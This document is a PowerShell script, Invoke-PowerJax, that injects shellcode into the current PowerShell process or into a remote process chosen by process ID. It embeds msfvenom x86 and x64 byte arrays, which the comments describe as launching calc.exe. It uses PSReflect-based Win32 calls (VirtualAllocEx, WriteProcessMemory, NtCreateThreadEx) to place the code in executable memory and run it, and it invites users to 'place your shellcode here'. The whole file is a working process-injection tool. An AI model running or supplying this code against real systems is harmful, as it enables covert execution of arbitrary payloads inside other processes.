function Invoke-PowerJax{
    <#

    .SYNOPSIS
    This tool can be used to inject shellcode into the current powershell process or into a remote process. Currently, you can only inject shellcode into 
    a process of the same architecture (x86/x86-64) as powershell. To access the WinApi32 calls, this script uses code from Matt Graeber's PSRelfect module. 
    In the future, I hope to implement cross architecture injection using the heavens gate segment selector (FS:33).

    Author: Xorrior, twitter: @xorrior
    
    PSReflect code:
    Author: Matt Graeber, twitter: @mattifestation

    .DESCRIPTION
    Injects shellcode into the current powershell process or remote process

    .PARAMETER ProcID
    Process ID of the remote process 

    .EXAMPLE
    Invoke-HeavensNeedle

    Inject shellcode contained within the script into the current powershell process 

    .EXAMPLE
    Invoke-HeavensNeedle 3476

    Inject shellcode contained within the script into the remote process

    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [Int32]$ProcID
        
    )


    # Place your Shellcode here: 
    #msfvenom -p windows/exec CMD="calc.exe" EXITFUNC=thread -f powershell 
    [Byte[]] $global:buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31
    $global:buf += 0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52
    $global:buf += 0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff
    $global:buf += 0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd
    $global:buf += 0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b
    $global:buf += 0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1
    $global:buf += 0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3
    $global:buf += 0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac
    $global:buf += 0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3
    $global:buf += 0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58
    $global:buf += 0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c
    $global:buf += 0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24
    $global:buf += 0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f
    $global:buf += 0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x1,0x8d
    $global:buf += 0x85,0xb2,0x0,0x0,0x0,0x50,0x68,0x31,0x8b,0x6f
    $global:buf += 0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6
    $global:buf += 0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80
    $global:buf += 0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a
    $global:buf += 0x0,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65
    $global:buf += 0x78,0x65,0x0


    #Place your x86_64 shellcode here 
    #msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f powershell 
   [Byte[]] $global:buf64 = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0
    $global:buf64 += 0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2
    $global:buf64 += 0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48
    $global:buf64 += 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7
    $global:buf64 += 0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c
    $global:buf64 += 0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41
    $global:buf64 += 0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52
    $global:buf64 += 0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88
    $global:buf64 += 0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1
    $global:buf64 += 0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49
    $global:buf64 += 0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34
    $global:buf64 += 0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0
    $global:buf64 += 0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0
    $global:buf64 += 0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1
    $global:buf64 += 0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0
    $global:buf64 += 0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49
    $global:buf64 += 0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41
    $global:buf64 += 0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59
    $global:buf64 += 0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0
    $global:buf64 += 0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff
    $global:buf64 += 0xff,0xff,0x5d,0x48,0xba,0x1,0x0,0x0,0x0,0x0
    $global:buf64 += 0x0,0x0,0x0,0x48,0x8d,0x8d,0x1,0x1,0x0,0x0
    $global:buf64 += 0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0
    $global:buf64 += 0x1d,0x2a,0xa,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff
    $global:buf64 += 0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80
    $global:buf64 += 0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a
    $global:buf64 += 0x0,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c
    $global:buf64 += 0x63,0x2e,0x65,0x78,0x65,0x0


    #Using Graeber's PSReflect code to access Win32Api
    #http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
    #Helper function for in Memory Modules 
   function New-InMemoryModule
   {

        Param
        (
            [Parameter(Position = 0)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ModuleName = [Guid]::NewGuid().ToString()
        )

        $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

        foreach ($Assembly in $LoadedAssemblies) {
            if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
                return $Assembly
            }
        }

        $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
        $Domain = [AppDomain]::CurrentDomain
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

        return $ModuleBuilder
    }

    # A helper function used to reduce typing while defining function
    # prototypes for Add-Win32Type.
    function func
    {
        Param
        (
            [Parameter(Position = 0, Mandatory = $True)]
            [String]
            $DllName,

            [Parameter(Position = 1, Mandatory = $True)]
            [string]
            $FunctionName,

            [Parameter(Position = 2, Mandatory = $True)]
            [Type]
            $ReturnType,

            [Parameter(Position = 3)]
            [Type[]]
            $ParameterTypes,

            [Parameter(Position = 4)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention,

            [Parameter(Position = 5)]
            [Runtime.InteropServices.CharSet]
            $Charset,

            [Switch]
            $SetLastError
        )

        $Properties = @{
            DllName = $DllName
            FunctionName = $FunctionName
            ReturnType = $ReturnType
        }

        if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
        if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
        if ($Charset) { $Properties['Charset'] = $Charset }
        if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

        New-Object PSObject -Property $Properties
    }

    function Add-Win32Type
    {

        [OutputType([Hashtable])]
        Param(
            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $DllName,

            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [String]
            $FunctionName,

            [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
            [Type]
            $ReturnType,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Type[]]
            $ParameterTypes,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CallingConvention]
            $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Runtime.InteropServices.CharSet]
            $Charset = [Runtime.InteropServices.CharSet]::Auto,

            [Parameter(ValueFromPipelineByPropertyName = $True)]
            [Switch]
            $SetLastError,

            [Parameter(Mandatory = $True)]
            [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
            $Module,

            [ValidateNotNull()]
            [String]
            $Namespace = ''
        )

        BEGIN
        {
            $TypeHash = @{}
        }

        PROCESS
        {
            if ($Module -is [Reflection.Assembly])
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
                }
                else
                {
                    $TypeHash[$DllName] = $Module.GetType($DllName)
                }
            }
            else
            {
                # Define one type for each DLL
                if (!$TypeHash.ContainsKey($DllName))
                {
                    if ($Namespace)
                    {
                        $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                    }
                    else
                    {
                        $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                    }
                }

                $Method = $TypeHash[$DllName].DefineMethod(
                    $FunctionName,
                    'Public,Static,PinvokeImpl',
                    $ReturnType,
                    $ParameterTypes)

                # Make each ByRef parameter an Out parameter
                $i = 1
                foreach($Parameter in $ParameterTypes)
                {
                    if ($Parameter.IsByRef)
                    {
                        [void] $Method.DefineParameter($i, 'Out', $null)
                    }

                    $i++
                }

                $DllImport = [Runtime.InteropServices.DllImportAttribute]
                $SetLastErrorField = $DllImport.GetField('SetLastError')
                $CallingConventionField = $DllImport.GetField('CallingConvention')
                $CharsetField = $DllImport.GetField('CharSet')
                if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

                # Equivalent to C# version of [DllImport(DllName)]
                $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
                $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

                $Method.SetCustomAttribute($DllImportAttribute)
            }
        }

        END
        {
            if ($Module -is [Reflection.Assembly])
            {
                return $TypeHash
            }

            $ReturnTypes = @{}

            foreach ($Key in $TypeHash.Keys)
            {
                $Type = $TypeHash[$Key].CreateType()
            
                $ReturnTypes[$Key] = $Type
            }

            return $ReturnTypes
        }
    }

   
    #End of PSReflect code 

    
    
    #Check the OS architecture.
   
    if((Get-WmiObject -class win32_operatingsystem).OSArchitecture -eq '64-bit'){
        $script:OSbitness = 64 
    }
    else{
        $script:OSbitness = 32 
    }
    #Check the architecture of the current process we are in
    #System.IntPtr is 4 bytes on a 32 bit system and 8 bytes on a 64-bit system 
    if([IntPtr]::size -eq 4){
        $script:CurrProcArc = 32
    }
    elseif([IntPtr]::size -eq 8){
        $script:CurrProcArc = 64
    }
    else{
        Write-Verbose 'Unable to determine whether current process is 32 or 64-bit'
        break
    }

       
    #Define the functions we need for injection
    $Module = New-InMemoryModule -ModuleName Win32

    $FunctionDefinitions = @(
        (func kernel32 OpenProcess ([IntPtr]) @([Int32], [Bool], [Int32]) -SetLastError),
        (func kernel32 VirtualAllocEx ([IntPtr]) @([IntPtr], [IntPtr], [IntPtr], [Int32], [Int32]) -SetLastError),
        (func kernel32 VirtualAlloc ([IntPtr]) @([IntPtr], [IntPtr], [Int32], [Int32]) -SetLastError),
        (func kernel32 WriteProcessMemory ([Bool]) @([IntPtr], [IntPtr], [byte[]], [int], [IntPtr]) -SetLastError),
        (func kernel32 RtlMoveMemory ([Void]) @([IntPtr], [IntPtr], [Int]) -SetLastError),
        (func kernel32 CreateThread ([IntPtr]) @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError)
        (func kernel32 WaitForSingleObject ([Int32]) @([IntPtr], [Int32]) -SetLastError),
        (func kernel32 IsWow64Process ([bool]) @([IntPtr], [Bool].MakeByRefType()) -SetLastError),
        (func kernel32 CreateRemoteThread ([IntPtr]) @([IntPtr], [IntPtr], [Int32], [IntPtr], [IntPtr], [Int32], [IntPtr]) -SetLastError),
        (func ntdll NtCreateThreadEx ([Int32]) @([IntPtr].MakeByRefType(), [Int32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [Int32], [Int32], [Int32], [IntPtr]) -SetLastError),
        (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
    )
    
    #Create the necessary types 
    $Types = $FunctionDefinitions | Add-Win32Type -Module $module -Namespace 'Win32'
    $kernel32 = $Types['kernel32']
    $ntdll = $Types['ntdll']

    #If the process id is not given, inject into the current ps process 
    If(-not $ProcID){
        #If the current ps process is 32 bit
        if($script:CurrProcArc -eq 32){
            $SizePtr = ([System.Runtime.InteropServices.Marshal]::AllocHGlobal($global:buf.Length)) #copy our shellcode size to an IntPtr
            $baseAddress = $kernel32::VirtualAlloc(0, $SizePtr, 0x3000, 0x40) #Call VirtualAlloc to allocate memory in the current process
            [System.Runtime.InteropServices.Marshal]::Copy($global:buf, 0, $baseAddress, $global:buf.Length) #Copy our shellcode to the baseAddress
            $ThreadPtr = [IntPtr]::Zero 
            $ThrHandle = $kernel32::CreateThread(0, 0, $baseAddress, 0, 0, $ThreadPtr) #Start a thread at the address of our shellcode in the current powershell process
            Write-Verbose "Started a thread at the address: $baseAddress"
            $Result = $kernel32::WaitForSingleObject($ThrHandle, 0xFFFFFFFF)
        }
        else{
            #If the current ps process is 64-bit
            $SizePtr = ([System.Runtime.InteropServices.Marshal]::AllocHGlobal($global:buf64.Length)) #copy our shellcode size to an IntPtr
            $baseAddress = $kernel32::VirtualAlloc(0, $SizePtr, 0x3000, 0x40) #Call VirtualAlloc to allocate memory in the current process
            [System.Runtime.InteropServices.Marshal]::Copy($global:buf64, 0, $baseAddress, $global:buf64.Length) #Copy our shellcode to the baseAddress
            $ThreadPtr = [IntPtr]::Zero 
            $ThrHandle = $kernel32::CreateThread(0, 0, $baseAddress, 0, 0, $ThreadPtr) #Start a thread at the address of our shellcode in the current powershell process
            Write-Verbose "Started a thread at address : $baseAddress"
            $Result = $kernel32::WaitForSingleObject($ThrHandle, 0xFFFFFFFF)
        }
    }
    else{
        if($script:OSbitness -eq 64){
            #If the OS is x64, go through our checks 
            $ProcessHandle = $kernel32::OpenProcess(0x001F0FFF, $False, $ProcID)
            Write-Verbose "Acquired process handle: $ProcessHandle" 
            $IsWow64 = $False 
            $Result = $kernel32::IsWow64Process($ProcessHandle, [ref]$IsWow64) #Check if the process is a Wow64 process
            Write-Verbose "IsWow64Process ? $Result"
            if(($IsWow64 -eq $false) -and ($script:CurrProcArc -eq 64)){
                $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf64.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process 
                Write-Verbose "$baseAddress"
                [IntPtr]$bytesWritten = 0
                $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf64, $global:buf64.Length, $bytesWritten) #Copy the shellcode to the remote process 
                Write-Verbose "$WriteResult"
                [IntPtr]$ArgPtr = [IntPtr]::Zero
                [IntPtr]$ThreadHandle = [IntPtr]::Zero
                $ThreadResult = $ntdll::NtCreateThreadEx([ref]$ThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $baseAddress, $ArgPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) #Create thread in remote process 
                Write-Verbose "Created remote thread at address : $baseAddress"
                #$result = $kernel32::CloseHandle($ThreadHandle)
            }
            elseif(($IsWow64 -eq $False) -and ($script:CurrProcArc -eq 32)){
                Write-Verbose "Cannot inject shellcode from 32 -> 64"
                #Cross architecture injection coming
                break
            }
            elseif(($IsWow64) -and ($script:CurrProcArc -eq 32)){
                $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process
                Write-Verbose "$baseAddress" 
                [IntPtr]$bytesWritten = 0
                $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf, $global:buf.Length, $bytesWritten) #Copy the shellcode to the remote process
                Write-Verbose "$WriteResult"
                [IntPtr]$ArgPtr = [IntPtr]::Zero
                [IntPtr]$ThreadHandle = [IntPtr]::Zero
                $ThreadResult = $ntdll::NtCreateThreadEx([ref]$ThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $baseAddress, $ArgPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) #Create thread in remote process 
                #$result = $kernel32::CloseHandle($ThreadHandle)
            }
            else{
                Write-Verbose "Cannot Inject shellcode from 64 -> 32"
                #Cross architecture injection coming soon
            }

        }
        else {
            $ProcessHandle = $kernel32::OpenProcess(0x001F0FFF, $False, $ProcID) #Obtain a handle to the remote process 
            Write-Verbose "$ProcessHandle"
            $baseAddress = $kernel32::VirtualAllocEx($ProcessHandle, 0, $global:buf.Length + 1, 0x3000, 0x40) #Allocate memory in the remote process 
            Write-Verbose "$baseAddress"
            [IntPtr]$bytesWritten = 0
            $WriteResult = $kernel32::WriteProcessMemory($ProcessHandle, $baseAddress, $global:buf, $global:buf.Length, $bytesWritten) #Copy shellcode to remote process 
            Write-Verbose "$WriteResult"
            [IntPtr]$ArgPtr = [IntPtr]::Zero
            [IntPtr]$ThreadHandle = [IntPtr]::Zero
            $ThreadResult = $ntdll::NtCreateThreadEx([ref]$ThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $baseAddress, $ArgPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) #Create thread in remote process 
            #$result = $kernel32::CloseHandle($ThreadHandle)
        }
    }
        

}